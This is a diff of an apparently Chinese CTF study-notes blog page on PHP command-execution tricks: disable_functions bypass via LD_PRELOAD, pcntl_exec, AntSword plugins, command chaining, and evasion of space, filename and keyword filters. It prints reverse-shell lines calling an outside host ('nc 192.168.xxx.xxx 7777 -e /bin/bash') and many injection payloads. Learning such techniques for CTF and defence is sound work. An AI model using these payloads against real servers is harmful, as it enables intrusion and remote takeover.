@@ -86,7 +86,7 @@
 <p><strong>直接回显，不需要print_r</strong></p>
 <p>shell_exec(string $cmd)</p>
 <p><strong>无回显，需要print_r，echo..</strong></p>
-<h3 id="反引号-cmd"><a href="#反引号-cmd" class="headerlink" title="反引号\$cmd"></a>反引号<code>\$cmd</code></h3><p><strong>无回显</strong></p>
+<h3 id="反引号-cmd"><a href="#反引号-cmd" class="headerlink" title="反引号`$cmd`"></a>反引号`$cmd`</h3><p><strong>无回显</strong></p>
 <h3 id="popen-string-command-string-mode"><a href="#popen-string-command-string-mode" class="headerlink" title="popen(string $command,string $mode)"></a>popen(string $command,string $mode)</h3><p>mode(模式):’r’表示阅读,’w’表示写入。（命令执行后会把内容放到一个临时文档）</p>
 <p>这个文档需要用fgets获取内容,用print_r输出内容</p>
 <p><strong>‘w’模式支持自动回显，r模式需要用print_r</strong></p>
@@ -99,7 +99,7 @@
 <p>3:$envs是字符串数组，key&#x3D;&gt;value格式,key代表要传递的环境变量的名称，value代表环境变量的值</p>
 <h2 id="二、替换绕过函数过滤"><a href="#二、替换绕过函数过滤" class="headerlink" title="二、替换绕过函数过滤"></a>二、替换绕过函数过滤</h2><p>过滤exec|system|popen|proc_open|`</p>
 <p>用其他函数,如passthru(‘cmd’)绕过</p>
-<h3 id="LD-PRELOAD绕过原理"><a href="#LD-PRELOAD绕过原理" class="headerlink" title="LD_PRELOAD绕过原理"></a>LD_PRELOAD绕过原理</h3><h4 id="1-应用场景"><a href="#1-应用场景" class="headerlink" title="1.应用场景"></a>1.应用场景</h4><p>disable_functions禁用所有可能用到的命令执行函数</p>
+<h2 id="三、LD-PRELOAD绕过原理"><a href="#三、LD-PRELOAD绕过原理" class="headerlink" title="三、LD_PRELOAD绕过原理"></a>三、LD_PRELOAD绕过原理</h2><h4 id="1-应用场景"><a href="#1-应用场景" class="headerlink" title="1.应用场景"></a>1.应用场景</h4><p>disable_functions禁用所有可能用到的命令执行函数</p>
 <h4 id="2-程序的链接"><a href="#2-程序的链接" class="headerlink" title="2.程序的链接"></a>2.程序的链接</h4><p>(1)静态链接:在程序运行之前先将各个目标模块以及所需要的库函数链接成一个完整的可执行程序，之后不再拆开。<br>(2)装入时动态链接:源程序编译后所得到的一组目标模块，在装入内存时，边装入边链接。<br>(3)运行时动态链接:原程序编译后得到的目标模块，在程序执行过程中需要用到时才对它进行链接。<br>    对于动态链接来说，需要一个动态链接库，其作用在于当动态库中的函数发生变化对于可执行程序来说时透明的，可执行程序无需重新编译，方便程序的发布&#x2F;维护&#x2F;更新。</p>
 <h4 id="3-LD-PRELOAD"><a href="#3-LD-PRELOAD" class="headerlink" title="3.LD_PRELOAD"></a>3.LD_PRELOAD</h4><p>修改库文件</p>
 <p>影响程序运行时的链接，加载别的动态链接可以，甚至覆盖正常的库</p>
@@ -135,7 +135,7 @@
 <p>粘贴到<code>vim poc.c</code>，<code>gcc -shared -fPIC demo.c -o demo.so</code>编译成.so文件，生成动态链接库文件</p>
 <p>从&#x2F;root&#x2F;php找到demo.so，拷贝到windows</p>
 <p>再编辑demo.php文件</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="title function_ invoke__">putenv</span>(<span class="string">&quot;LD_PRELOAD=./poc.so&quot;</span>);</span><br><span class="line">    <span class="title function_ invoke__">mail</span>(<span class="string">&quot;,&quot;</span>,<span class="string">&quot;,&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="title function_ invoke__">putenv</span>(<span class="string">&quot;LD_PRELOAD=./poc.so&quot;</span>);</span><br><span class="line">    <span class="title function_ invoke__">mail</span>(<span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;&#x27;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
 
 <p>一起上传到蚁剑,网页访问&#x2F;demo.php，在tmp目录找到flag</p>
 <p>*为了避免重复上传文件，更改c文件的system为<code>system(&quot;nc 192.168.xxx.xxx 7777 -e /bin/bash&quot;)</code>反弹shell</p>
@@ -150,6 +150,97 @@
 
 <p>上传.so,.php</p>
 <p>访问url&#x2F;demo.php?cmd&#x3D;ls&amp;outpath&#x3D;&#x2F;tmp&#x2F;benben&amp;sopath&#x3D;.&#x2F;demo.so</p>
+<h2 id="四、蚁剑及pcntl绕过函数过滤"><a href="#四、蚁剑及pcntl绕过函数过滤" class="headerlink" title="四、蚁剑及pcntl绕过函数过滤"></a>四、蚁剑及pcntl绕过函数过滤</h2><h3 id="1-蚁剑"><a href="#1-蚁剑" class="headerlink" title="1.蚁剑"></a>1.蚁剑</h3><p><img src="/../images/0421-1.png"></p>
+<p>利用蚁剑的插件绕过</p>
+<p><img src="/../images/0421/0421-3.png"></p>
+<p><img src="/../images/0421/0421-4.png"></p>
+<p>蚁剑链接.antproxy.php文件，即可成功执行命令，在虚拟终端中利用<code>tac /flag</code>即可读取</p>
+<p><strong>PHP7 GC with Certain Destructors UAF</strong>直接打开虚拟终端</p>
+<h3 id="2-pcntl-exec"><a href="#2-pcntl-exec" class="headerlink" title="2.pcntl_exec"></a>2.pcntl_exec</h3><p>需要单独安装</p>
+<p>pcntl_exec(1,2,3)</p>
+<ol>
+<li>string $path :必须是可执行二进制文件路径或一个在文件第一行制定了一个可执行文件路径标头的脚本(例如#!&#x2F;lusr&#x2F;local&#x2F;bin&#x2F;perl)</li>
+<li>array $args:传递给程序的单数的字符串数组，用于执行命令</li>
+<li>envs:环境变量，忽略</li>
+</ol>
+<p>例如*#&#x2F;bin&#x2F;bash* -c &#x2F;bin&#x2F;ls 前面是path 后面是args	-c为执行此二进制文件</p>
+<p>前提：info信息中没有禁用pcntl_exec函数</p>
+<p>pcntl_exec函数没有回显</p>
+<ol>
+<li>cat文件并输出到有权限读取的路径</li>
+<li>shell反弹</li>
+</ol>
+<p>payload:<code>cmd=pcntl_exec(&quot;/bin/bash&quot;,array(&quot;-c&quot;,&quot;nc 192.168.xxx.xxx 7777 -e /bin/bash&quot;));</code>注意是post还是get</p>
+<p><code>nc -lvp 7777</code>监听端口即可</p>
+<h2 id="五、操作系统连接符"><a href="#五、操作系统连接符" class="headerlink" title="五、操作系统连接符"></a>五、操作系统连接符</h2><p>拼接命令</p>
+<h3 id="1-分号-；"><a href="#1-分号-；" class="headerlink" title="1.分号   ；"></a>1.分号   ；</h3><p>可以使命令都执行,类似sql堆叠注入</p>
+<p>用法:可以提前闭合命令，或加上其他东西报错</p>
+<p><code>-666;cat /flag;</code> 需要在页面源代码查看（tac指令可以直接显示）</p>
+<h3 id="2"><a href="#2" class="headerlink" title="2.&amp;"></a>2.&amp;</h3><p><strong>必须url编码%26</strong></p>
+<p>与；效果接近 ，同时执行多条命令</p>
+<h3 id="3-与"><a href="#3-与" class="headerlink" title="3. &amp;&amp;	与"></a>3. &amp;&amp;	与</h3><p>如果前面命令执行成功，则执行后面命令，记得编码</p>
+<p>?cmd&#x3D;%26%26pwd%26%26tac &#x2F;flag</p>
+<h3 id="4-管道输出符"><a href="#4-管道输出符" class="headerlink" title="4.|	管道输出符"></a>4.|	管道输出符</h3><p>把前面的命令输出座位后面命令的输入，都会执行，但只显示后面执行的结果</p>
+<p><code>echo &quot;ls -l&quot; | /bin/bash</code></p>
+<h3 id="5-或"><a href="#5-或" class="headerlink" title="5.||	或"></a>5.||	或</h3><p>前面执行成功则后面的不执行，前面的失败后面的执行</p>
+<p>应用:</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(_FILE_);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="variable">$cmd</span>=$ GET[<span class="string">&quot;cmd&quot;</span>];</span><br><span class="line"><span class="variable">$cmd</span> = <span class="variable">$cmd</span>.<span class="string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>;<span class="comment">//八所偶遇输出全部扔进垃圾桶</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$cmd</span>))&#123;</span><br><span class="line"><span class="title function_ invoke__">system</span>(<span class="variable">$cmd</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>绕过方法:</p>
+<p><code>cmd=ls||</code>忽略掉后边的指令</p>
+<h2 id="六、空格过滤绕过"><a href="#六、空格过滤绕过" class="headerlink" title="六、空格过滤绕过"></a>六、空格过滤绕过</h2><p><code>$cmd= preg replace(&quot;# #&quot;,&quot;&quot;,$cmd);</code>正则替换</p>
+<p>例如:ls -l查看文件详细信息将失效</p>
+<p>绕过方法:</p>
+<p>1.大括号{cat,flag.txt}</p>
+<p>2.$IFS，${IFS}，$IFS$9 (内敛字段分隔符)     	在Linux系统中用加大括号界定</p>
+<p>3.重定向字符&lt;,&lt;&gt;;</p>
+<p>“&lt;”是输出重定向的意思，就是把&lt;后面跟的文件取代键盘作为新的输入设备</p>
+<p>cat&lt;flag.php;	cat&lt;&gt;flag.php(&gt;会创建文件)</p>
+<p>4.url编码%09-&gt;Tab %20-&gt;[空格]</p>
+<h2 id="七、文件名过滤绕过"><a href="#七、文件名过滤绕过" class="headerlink" title="七、文件名过滤绕过"></a>七、文件名过滤绕过</h2><p><code>!preg_match(&quot;/flag|system|php/i&quot;,$cmd)</code></p>
+<h3 id="绕过方法"><a href="#绕过方法" class="headerlink" title="绕过方法"></a>绕过方法</h3><h4 id="1-通配符-绕过"><a href="#1-通配符-绕过" class="headerlink" title="1.通配符? *绕过"></a>1.通配符? *绕过</h4><p>cat fl?g.php</p>
+<p>?在Linux可以替代字母，可以替代很多字母 ????.???</p>
+<p>*可以进行模糊匹配,代表任何字符串 cat f*</p>
+<h4 id="2-单引号，双引号绕过"><a href="#2-单引号，双引号绕过" class="headerlink" title="2.单引号，双引号绕过"></a>2.单引号，双引号绕过</h4><p>‘’，””空字符	插入空字符</p>
+<p>fl””ag fl&#39;&#39;ag</p>
+<h4 id="3-反斜杠"><a href="#3-反斜杠" class="headerlink" title="3.反斜杠"></a>3.反斜杠</h4><p>反斜杠是换行的标志</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">f/lag==</span><br><span class="line">f</span><br><span class="line">lag</span><br></pre></td></tr></table></figure>
+
+<h4 id="4-特殊变量"><a href="#4-特殊变量" class="headerlink" title="4.特殊变量"></a>4.特殊变量</h4><p>$1,$9,$@,$*无意义的字符</p>
+<h4 id="5-内联执行"><a href="#5-内联执行" class="headerlink" title="5.内联执行"></a>5.内联执行</h4><p><code>a=f;d=ag;c=l;cat \$a\$c\$b.txt</code></p>
+<h4 id="6-利用Linux中的环境变量"><a href="#6-利用Linux中的环境变量" class="headerlink" title="6.利用Linux中的环境变量"></a>6.利用Linux中的环境变量</h4><p>试用环境变量里的字符执行变量</p>
+<p><code>echo $PATH</code>会输出环境变量</p>
+<p><code>$&#123;PATH：5:1&#125;</code>代表从第5个字符起取出1个字符</p>
+<p><code>/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin</code></p>
+<p>&#x2F;也是字符,从0开始数</p>
+<p><code>#echo f$&#123;PATH:5:1&#125;$&#123;PATH:8:1&#125;$&#123;PATH:66:1&#125;g.$&#123;PATH:93:1&#125;h$&#123;PATH:93:1&#125;</code></p>
+<h2 id="八、常见文件读取命令绕过"><a href="#八、常见文件读取命令绕过" class="headerlink" title="八、常见文件读取命令绕过"></a>八、常见文件读取命令绕过</h2><p><code>(!preg_match(&quot;/flag|php|cat|sort|shell\&#39;/i&quot;,$cmd)</code></p>
+<p>绕过方法:</p>
+<ol>
+<li><p>tac:反向显示<br>自下而上</p>
+</li>
+<li><p>more:一页一页的显示档案内容 查看源代码</p>
+</li>
+<li><p>less:效果和more类似</p>
+</li>
+<li><p>tail:查看末尾几行（最后十行）</p>
+</li>
+<li><p>nl:显示的时候显示行号，查看源代码</p>
+</li>
+<li><p>od：以二进制方式读取文件内容<br><code>cmd=passthru(&quot;od -A d -c fla\g/ph\p&quot;)</code>可以把ascii码转换成字符,一行32字节</p>
+</li>
+<li><p>xxd:读取二进制文档<br>左边二进制右边字符</p>
+</li>
+<li><p>sort:主要用于排序文件<br><code>?cmd=passthru(&quot;/usr/bin/so?t fl\ag.p\hp&quot;)</code>应对sort被过滤</p>
+</li>
+<li><p>uniq：报告或删除文件中重复的行</p>
+</li>
+<li><p>file -f:报错出具体内容</p>
+</li>
+<li><p>grep：在文本中查找指定的字符串<br><code>grep fl fla*</code> 从fla*文件中搜索包含fla的字符串的行,一般搜索{</p>
+<p>一定记得最后加分号</p>
+</li>
+</ol>
 
                 
                 <p class="end">__END__</p>
